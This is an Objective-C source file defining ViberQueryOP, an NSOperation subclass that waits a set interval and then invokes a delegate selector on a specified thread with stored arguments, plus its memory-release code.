//
//  ViberQueryOP.m
//  MSFSP
//
//  Created by Makara Khloth on 8/8/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "ViberQueryOP.h"


@implementation ViberQueryOP

@synthesize mArguments, mDelegate, mSelector, mWaitInterval;

- (void)main {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	[NSThread sleepForTimeInterval:[self mWaitInterval]];
	NSThread *cthread = [mArguments lastObject];
	DLog (@"The operation is wake up ...")
	[mDelegate performSelector:mSelector
                      onThread:cthread
                    withObject:mArguments
                 waitUntilDone:YES];
	[pool release];
}

- (void) dealloc {
	[mArguments release];
	[mDelegate release];
	[super dealloc];
}

@end
